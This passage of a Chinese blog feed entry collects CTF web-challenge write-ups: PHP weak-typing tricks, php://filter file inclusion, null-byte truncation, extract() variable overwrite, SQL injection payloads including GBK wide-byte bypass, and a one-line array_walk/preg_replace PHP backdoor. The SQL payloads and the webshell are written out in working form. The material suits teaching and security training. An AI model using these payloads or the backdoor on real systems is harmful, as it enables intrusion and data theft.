    <content type="html"><![CDATA[<p>本文总结了CTF中我所遇到的题型及其write up，本文长期更新</p><a id="more"></a><p>希望各位多多评论指正，也算作对我第一次写技术文章的鼓励！</p><hr><p>训练场：<a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">南京邮电大学CTF题库</a></p><hr><h1 id="直接查看源码"><a href="#直接查看源码" class="headerlink" title="直接查看源码"></a>直接查看源码</h1><p>出现场景：一般出现在第一题</p><p>write  up： 直接Ctrl+u查看网页源码寻找flag</p><h1 id="修改maxlength"><a href="#修改maxlength" class="headerlink" title="修改maxlength"></a>修改maxlength</h1><p>出现场景：输入框输入内容有位数限制</p><p>write up：F12进入开发者模式修改maxlength后提交</p><h1 id="IP伪造"><a href="#IP伪造" class="headerlink" title="IP伪造"></a>IP伪造</h1><p>各种伪造IP的HTTP头：</p><table><thead><tr><th>序号</th><th>伪造方式</th></tr></thead><tbody><tr><td>1</td><td>X-Forwarded-For</td></tr><tr><td>2</td><td>Client-IP</td></tr><tr><td>3</td><td>x-remote-IP</td></tr><tr><td>4</td><td>x-originating-IP</td></tr><tr><td>5</td><td>x-remote-addr</td></tr></tbody></table><h1 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h1><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       $one = ord(<span class="string">'1'</span>);</span><br><span class="line">       $nine = ord(<span class="string">'9'</span>);</span><br><span class="line">       <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">       &#123;   </span><br><span class="line">               $digit = ord($number&#123;$i&#125;);</span><br><span class="line">               <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">               &#123;</span><br><span class="line">                       <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">               &#125;</span><br><span class="line">       &#125;</span><br><span class="line">          <span class="keyword">return</span> $number == <span class="string">'54975581388'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$flag=<span class="string">'*******'</span>;</span><br><span class="line"><span class="keyword">if</span>(noother_says_correct($_GET[<span class="string">'key'</span>]))</span><br><span class="line">   <span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">'access denied'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：要求传入key不包含数字[1-9]，但又等于54975581388，考虑转十六进制，发现<code>54975581388=0xccccccccc</code>,因此get方法传值<code>key=0xccccccccc</code></p><h1 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h1><h2 id="类型一"><a href="#类型一" class="headerlink" title="类型一"></a>类型一</h2><p>介绍：PHP在处理哈希字符串时，会利用“!=”或“==”<br>来对哈希值进行比较，它把每一个以”0e”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0e”开头的，那么PHP将会认为他们相同，都是0</p><p>出现场景：PHP代码审计、含md5的题</p><p>write  up：</p><p>修复方法：“===”和“!==”strict比较符，只有在类型相同时才相等。“==”和“!=”即non-strict比较符，会在类型转换后进行比较</p><p>扩展：0e开头MD5值小结</p><table><thead><tr><th>string</th><th>md5()</th></tr></thead><tbody><tr><td>s878926199a</td><td>0e545993274517709034328855841020</td></tr><tr><td>s155964671a</td><td>0e342768416822451524974117254469</td></tr><tr><td>s214587387a</td><td>0e848240448830537924465865611904</td></tr></tbody></table><h2 id="类型二"><a href="#类型二" class="headerlink" title="类型二"></a>类型二</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'b'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'a'</span>] != $_GET[<span class="string">'b'</span>])</span><br><span class="line"><span class="keyword">if</span> (md5($_GET[<span class="string">'a'</span>]) == md5($_GET[<span class="string">'b'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Wrong.'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析：$_GET可以接受数组但MD5()函数若传递进去一个数组，则会返回null.因此向$_GET数组传入两个名为a、b的不相等的数组从而导致md5()均返回空:index.php?a[]=1&amp;b[]=2（即null=null）</p><h1 id="脑洞题"><a href="#脑洞题" class="headerlink" title="脑洞题"></a>脑洞题</h1><ol><li>源码找url</li></ol><p><img src="/2018/10/12/CTF/E:/Blog/source/_posts/CTF/ccdj.png" alt="image"></p><ol start="2"><li>源码看flag</li></ol><p><img src="/2018/10/12/CTF/ccdj1.png" alt="image"></p><h1 id="jjencode-aaencode（颜文字）"><a href="#jjencode-aaencode（颜文字）" class="headerlink" title="jjencode/aaencode（颜文字）"></a>jjencode/aaencode（颜文字）</h1><p>介绍：</p><blockquote><p>什么是jjencode?</p><p>将js代码转换成只有符号的字符串</p></blockquote><blockquote><p>什么是aaencode？</p><p>将js代码转换成常用的网络表情</p></blockquote><p>aaencode加密：<a href="http://utf-8.jp/public/aaencode.html" target="_blank" rel="noopener">http://utf-8.jp/public/aaencode.html</a></p><p>解法：可以直接利用浏览器的控制台输入密文，执行后即可解密。</p><p><img src="/2018/10/12/CTF/AAencode.png" alt="image"></p><h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>典型的文件包含漏洞的格式网址：<code>php?file=xxx.php</code></p><p>原因：网页后端php（或其他）代码中使用了include等文件包含语句，而且所包含的文件由变量控制，恰恰此变量又能通过GET或POST等方式进行修改所造成的</p><p>利用方法：构建<code>file=php://filter/read=convert.base64-encode/resource=index.php</code></p><p>注：其中index.php可以为任意已包含文件返回base64加密过的index.php文件源码。</p><p><img src="/2018/10/12/CTF/wjbh.png" alt="image"></p><p>注意：python3中base64的解密为base64.b64decode()</p><h1 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h1><ol><li>精度问题</li></ol><p><code>intval()</code>这个函数的作用是把参数自动转换成整数（int）</p><blockquote><p>$id = intval(1024.5)//结果为$id==1024</p></blockquote><h1 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h1><p>介绍：robots.txt是搜索引擎中访问网站的时候要查看的第一个文件，robots.txt文件告诉了蜘蛛程序在服务器上什么文件是可以被查的。</p><h1 id="00"><a href="#00" class="headerlink" title="%00"></a>%00</h1><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'nctf'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, $_GET[<span class="string">'nctf'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'必须输入数字才行'</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'nctf'</span>], <span class="string">'#biubiubiu'</span>) !== <span class="keyword">FALSE</span>)   </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>涉及漏洞：查到资料</p><blockquote><p>1.ereg会把null视为字符串的结束，从而被%00截断，而strpos则可以越过%00</p></blockquote><blockquote><p>2.当ntf为数组时它的返回值不是FALSE</p></blockquote><p>利用方法：</p><blockquote><p>1.?nctf=1%00%23biubiubiu</p></blockquote><blockquote><p>2.?nctf[]=1</p></blockquote><h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] == <span class="string">"POST"</span>) &#123; <span class="meta">?&gt;</span></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    extract($_POST);</span><br><span class="line">    <span class="keyword">if</span> ($pass == $thepassword_123) &#123; <span class="meta">?&gt;</span></span><br><span class="line">        &lt;div class="alert alert-success"&gt;</span><br><span class="line">            &lt;code&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $theflag; <span class="meta">?&gt;</span>&lt;/code&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：<code>extract()</code>函数的作用：从数组中将变量导入到当前的符号表</p><blockquote><p>可以看到这里的代码为：extract($_POST)，即将POST的参数导入当前的符号表</p></blockquote><p>由于<code>extract()</code>函数存在变量覆盖漏洞，所以提交post参数：</p><p><code>pass=123&amp;thepassword_123=123//或者pass[]=&amp;thepassword_123</code></p><p>即:将两个变量的值修改成相同的，即可得到flag！</p><h1 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h1><p>源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">文件上传<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"upload.php"</span> <span class="attr">method</span>=<span class="string">"post"</span></span></span><br><span class="line"><span class="tag"><span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"dir"</span> <span class="attr">value</span>=<span class="string">"/uploads/"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x00截断"><a href="#0x00截断" class="headerlink" title="0x00截断"></a>0x00截断</h2><p>绕过方法：在burpsuite—Hex中，将空格php后面一个字符的hex修改为00</p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="常规注入"><a href="#常规注入" class="headerlink" title="常规注入"></a>常规注入</h2><h3 id="正常闭合"><a href="#正常闭合" class="headerlink" title="正常闭合"></a>正常闭合</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = trim($_POST[user]);</span><br><span class="line">  $pass = md5(trim($_POST[pass]));</span><br><span class="line">  $sql=<span class="string">"select user from ctf where (user='"</span>.$user.<span class="string">"') and (pw='"</span>.$pass.<span class="string">"')"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>.$sql;</span><br><span class="line">  $query = mysql_fetch_array(mysql_query($sql));</span><br><span class="line">  <span class="keyword">if</span>($query[user]==<span class="string">"admin"</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>($query[user] != <span class="string">"admin"</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;You are not admin!&lt;/p&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $query[user];</span><br></pre></td></tr></table></figure><p>分析：会对传入参数两端去空格，然后sql拼接如下</p><p><code>$sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot;;</code></p><p>所以只要用构造一下user的值，使语法无误，然后注释掉后面的即可。</p><p>MySQL主要有三种注释方式：</p><table><thead><tr><th>注释方式</th><th>说明</th></tr></thead><tbody><tr><td>#</td><td>注释到行尾</td></tr><tr><td>/*内容*/</td><td>用于行间或多行注释（也可用/**/代替空格）</td></tr><tr><td>–</td><td>也是注释到行尾，但需要注意的是在两个减号后面至少要有一个\s，也就是空格，TAB，换行符等（’ or 1=1–    ）</td></tr></tbody></table><p>解法：本题可post：<br><code>user=admin&#39;)-- -&amp;pass=123或user=admin&#39;)#&amp;pass=123</code></p><p>sql语句就变成<code>select user from ctf where (user=&#39;admin&#39;)#&#39; and (pw=&#39;123&#39;)</code></p><p>查询语句就能成功返回user列，值为admin的那条记录。</p><h3 id="union查询"><a href="#union查询" class="headerlink" title="union查询"></a>union查询</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = $_POST[user];</span><br><span class="line">  $pass = md5($_POST[pass]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select pw from ctf where user='$user'"</span>));</span><br><span class="line">  <span class="keyword">if</span> (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>解法：关键点在源代码第7、8行。首先要观察，我们能够控制的查询结果有<code>$query[pw]</code>的值，通过让union前的查询语句为空，查询结果由union后面的语句控制即可。</p><p>例如：<code>select pw from ctf where user=&#39;-1&#39; union select &#39;mytest&#39;</code>这样查询结果pw就是’mytest’这个字符串了。再看那个if语句，只看后面的判断，实际上只要输入的和查询的结果一致就行了。</p><p>注意别忘记输入pass后，会对其进行MD5加密。所以构造post：<code>user=&#39; union select md5(&#39;suqir&#39;)#&amp;pass=suqir</code>查询语句就变为<code>SELECT * FROM users WHERE name=&#39;admin&#39; AND pass=&#39;pass&#39;;</code></p><h3 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment">#GOAL: login as admin,then get the flag;</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">'db.inc.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($str)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">$str=stripslashes($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);</span><br><span class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line">$query=<span class="string">'SELECT * FROM users WHERE name=\''</span>.$username.<span class="string">'\' AND pass=\''</span>.$password.<span class="string">'\';'</span>;</span><br><span class="line">$result=mysql_query($query);</span><br><span class="line"><span class="keyword">if</span>(!$result || mysql_num_rows($result) &lt; <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid password!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>分析：这题的clean函数用来过滤引号，会将其转化为实体编码，所以我们没有办法直接用引号来闭合了，只能运用转义字符来吃掉后面的那个单引号了，即构造<code>username=suqir\&amp;password=or%201%23</code><br>使得查询语句如下</p><p><code>SELECT * FROM users WHERE name=&#39;suqir\&#39;&#39; AND pass=&#39;or%201%23&#39;</code></p><p>即</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> </span><br><span class="line"><span class="keyword">name</span>=<span class="string">'suqir\' AND pass='</span>            『 [<span class="keyword">name</span>]的值为 [<span class="string">' AND pass=]  ，显然逻辑值为false 』</span></span><br><span class="line"><span class="string">or 1                                『 但没关系，[false or 1] 的逻辑值为真』 </span></span><br><span class="line"><span class="string">#'</span>                                  『 注释掉多余的单引号 』</span><br><span class="line">即</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="literal">false</span> <span class="keyword">or</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>一道综合题:<a href="http://cms.nuptzj.cn/" target="_blank" rel="noopener">南邮CTF-综合题2</a>及其<a href="https://a2chitect.cn/2018/02/02/%E5%8D%97%E9%82%AECTF%E5%B9%B3%E5%8F%B0-Web-%E7%BB%BC%E5%90%88%E9%A2%982-Writeup/" target="_blank" rel="noopener">writeup</a></p><h2 id="GBK宽字节编码漏洞-gbk-sql-injection"><a href="#GBK宽字节编码漏洞-gbk-sql-injection" class="headerlink" title="GBK宽字节编码漏洞(gbk_sql_injection)"></a>GBK宽字节编码漏洞(gbk_sql_injection)</h2><p>介绍：php中MYSQL数据库,如果是GBK编码.一定要小心GBK宽字节编码漏洞<br>正常情况下 magic_quote_gpc 为ON,如果输入</p><p><code>http://www.xxxx.com/index.php?user=11′ and 1=2 #</code></p><p>SQL语句就会变成</p><p><code>SELECT * FROM user WHERE user=’1\’ and 1=2 #’</code></p><p>自动加上了\转义，如果构造特殊的宽字节编码呢？</p><p><code>http://www.xxxx.com/index.php?user=11%df%27 and 1=2 #</code></p><p>SQL语句就变成</p><p><code>SELECT * FROM user WHERE user=’11運’ and 1=2#’</code></p><p>这样就注入上了！</p><p><code>11%df</code>会被解析成<code>11運</code>,而<code>%27</code>被邪恶的解析成<code>&#39;</code>就绕过了gpc转义,就成功构造注入了</p><h1 id="Unix-Linux相关"><a href="#Unix-Linux相关" class="headerlink" title="Unix/Linux相关"></a>Unix/Linux相关</h1><h2 id="bash-history"><a href="#bash-history" class="headerlink" title="bash_history"></a>bash_history</h2><p>Bash shell在<code>~/.bash_history</code>（<code>~/</code>表示用户目录）文件中保存了500条使用过的命令，这样可以使你输入使用过的长命令变得容易。每个在系统中拥有账号的用户在他的目录下都有一个<code>.bash_history</code>文件。</p><p>为了安全，bash shell应该保存少量的命令，并且在每次用户注销时都把这些历史命令删除。</p><p>删除方法: 第一步：<code>/etc/profile</code>文件中的<code>HISTFILESIZE</code>和<code>HISTSIZE</code>行确定所有用户的<code>.bash_history</code>文件中可以保存的旧命令条数。强烈建议把把<code>/etc/profile</code>文件中的<code>HISTFILESIZE</code>和<code>HISTSIZE</code>行的值设为一个较小的数，比如30。编辑profile文件<code>vi /etc/profile</code>，把下面这行改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HISTFILESIZE=30</span><br><span class="line">HISTSIZE=30</span><br></pre></td></tr></table></figure><p>这表示每个用户的<code>.bash_history</code>文件只可以保存30条旧命令。</p><p>第二步：网管还应该在<code>/etc/skel/.bash_logout</code>文件中添加下面这行<code>rm -f $HOME/.bash_history</code>。这样，当用户每次注销时<code>.bash_history</code>文件都会被删除. </p><h2 id="vi编辑器的备份文件"><a href="#vi编辑器的备份文件" class="headerlink" title="vi编辑器的备份文件"></a>vi编辑器的备份文件</h2><p>linux下一般使用vi编辑器，并且异常退出会留下备份文件<code>xxx.swp</code></p><h1 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h1><h2 id="数组回调后门"><a href="#数组回调后门" class="headerlink" title="数组回调后门"></a>数组回调后门</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'www'</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">'wtf'</span>] =&gt; <span class="string">'|.*|e'</span>,);</span><br><span class="line">array_walk($arr, $e, <span class="string">''</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：利用了php中回调函数的后门，可以使<code>www</code>为<code>preg_replace</code>函数，当<code>array_walk()</code>将函数作用于数组时，POST传入的数据作为<code>preg_replace()</code>的第二个参数，在替换后被当做 php 代码执行（在php5.3下可用，5.5后preg_replace函数已弃用了使替换后的字符串作为php代码执行的/e修饰符）。</p><p>测试：<br><img src="/2018/10/12/CTF/hdhs.png" alt="image"></p><p><strong>未完待续。。。</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文总结了CTF中我所遇到的题型及其write up，本文长期更新&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透" scheme="https://blog.suqir.xyz/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="CTF" scheme="https://blog.suqir.xyz/tags/CTF/"/>
    
  </entry>
  
</feed>
